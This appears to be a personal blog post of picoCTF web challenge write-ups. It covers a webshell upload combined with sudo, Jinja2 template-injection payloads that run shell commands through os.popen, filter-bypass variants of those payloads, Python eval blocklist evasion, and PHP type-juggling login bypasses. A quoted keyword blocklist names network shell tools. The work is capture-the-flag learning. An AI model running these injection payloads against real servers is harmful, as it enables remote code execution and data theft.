+++
date = '2025-04-01T02:16:51Z'
draft = false
title = 'picoCTF / Web'

+++
# Cookie Monster Secret Recipe
http://verbal-sleep.picoctf.net:56241/
1. Logging on give hit "Check cookies"
2. value `secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D`
3. As evident from the %3d%3d, most likely base64 encoded.
4. Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}
# head-dump
- Need to find enpoint  with flag
- Documentation about API
- "browser_webshell_solvable"
1. So we have a home page with 4 blog posts of
	1. cyber
	2. nodejs/swagger ui / API documentation
	3. Logging
	4. and hacking
2. None of the \#links work, except for `#API Docuemntation` 
	1. get a Swagger docuemtnation page
		1. heapdump gets memory
		2. You can open it in text file
		3. CTRL+F "picoCTF{"
		4. picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae
# n0s4n1ty 1
- profile picture upload
- need to locate file upload area, and inside /root directory.
1. uploading file change image
2. "Update profile" button gives "File x.jpg has be uploaded Path: uplaods.jpg"
	1. uploaded [webshell.php](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php), find we are in /var/www/html/uploads
	2. ls /root gives us `Permission Denied`
		1. Check sudo?
		2. We have sudo!
	3. sudo ls /root finds /root/flag,txt
	4. sudo cat /root/flag.txt
	5. picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
# SSTI1
- announcer
- Whatever submitted in input box is then redirected to a page with jsut that text
- ca use `<script> alert(5)</script>`
- what can we do then...
- post / with content redirects to /announce

1. Try PHP innject
	1.  `<?php echo "test" ?>`
	2. It gets automatically commented out -> `<?php` tunrs into `<!---?php`
2. In the HTML, we can see a POST request get sent to /
3. Lets open burpsuite
4. Be stupid and lookup what SSTI means
	1. Server Side Template injection
	2. Using {{}} we can evaluate the command
	3. {{7\*7}} gives up 49 instead of the output!
5. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
	1. We find it is a Jinja2 injection
```
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

# WebSockFish
stockfish chessbot!
1. In the script, we can see how the game is ran and how out fish chat messages are sent
2. The chess/chessboard/stockfish .js files are pretty standard open source stuff
3. We look at the websock, which gives uses:
	1. sendMessage() to send data to websocket
	2. and appropiate updateMEssage() our fish dialog
4. On the bottom, we see that the scripts use this on the stockfish.onmessage() event
	1. sf.postMEssage() evaluates the chess engine to get a response
	2. then, depending on the response, we either perform the best move OR send a message to the websocket
		1. The two messages are "mate x" and "eval x"
		2. "mate x" looks like how soon the fish kills you
		3. "eval x" determines the position... i.e "i'm winning" or "i'm losing" or "its even"
5. If you sendMessage("eval -9999") we get our flag"

# 3v@l
Under the hood, there is an eval function from python
figure out how to execute bad code!
1. tried import os -> there are banlist words
2. even "os" as a string doesn't work
3. I'm stupid and its in an html comment
```
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```
we can instead use the `__import__()` function to get the libraries we need. We can sue them using strings. Normally, you'd need to put `import os`, where os is a keyterm. not we can do `__import__("o" + "s")`, then add `.listdir()` to see our directory

we also have access to t he `open().read()` functions. We can read the flask file with:
`open('app' + '.' + "py").read()`

Note: we can't put t"." with another letter as it will yell at us

__import__("o" + "s").listdir("/flag.txt")
__import__("o" + "s").listdir("~")
__import__("o" + "s").listdir(__import__("o" + "s").sep)
__import__("o" + "s").listdir(__import__("o" + "s").path.abspath("."+ ".") + "flag" + "." + "txt")
open(__import__("o" + "s").path.abspath("."+ ".") + "flag" + "." + "txt").read()

# SSTI2
Same set up
- some tests
- `{{ xxxx }}` still works
- function give server error
- {{ 1.1 }} shows 11, which means . is removed.
- () still work, but not within {} -> seems to be stripped?
	- except () together works. only ( breaks
- __ are stripped
- {{ config }} gets outputs
- periodds are removed, so are []
- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#common-bypasses
```
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag${IFS}')|attr('read')()%}{%print(a)%}{%endwith%}
```

# apriti sesame street
https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4
- hint says backup files from emacs
- emacs saves edited files as `filename.txt~`
	- we can tehn find the logic of the hpp in `impossibleLogin.php`
- refer to link above
- payload is `username[]=a&pwd[]=b` in body
	- \[\] turns the value into an array, which sha1 tries to cast into a string and then returns 0.
Intersting notes:
- php == is vulenrable to a lot of things
- md5 collisions when doing (md5) == (md5) sisnces strings starting with 0e are treated as 0.
- you can also type juggle strcmp
https://rst.hashnode.dev/bypassing-php-strcmp
# Pachinko
- I actually have 0 clue what i did but i connected 8-4-7.